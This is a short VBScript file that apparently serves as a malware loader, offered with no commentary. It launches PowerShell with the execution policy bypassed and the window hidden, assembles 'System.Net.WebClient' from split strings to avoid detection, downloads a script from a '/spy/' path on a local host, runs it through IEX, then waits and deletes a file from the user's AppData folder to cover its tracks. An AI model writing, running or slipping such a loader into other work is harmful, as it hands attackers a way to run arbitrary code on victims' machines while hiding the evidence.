Set WshShell = wScript.CreateObject("WScript.Shell")
ye7s=WshShell.ExpandEnvironmentStrings("%LocALaPpDaTA%")
athu = ye7s & TDHF
cpe038 = "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -ep bypass -w 1 -c ""$N='System.Net.w';$C='ebClient';(New-Object $N$C).DownloadString('http://127.0.0.1'+'/spy/aaaaa.txt')|IEX;"""
MsgBox cpe038
WshShell.Run cpe038, 0, True
Set WshShell =Nothing
Set tigg=CreateObject("Scripting.fileSyStemobject")
WScript.Sleep 90000
tigg.DeleteFile(athu)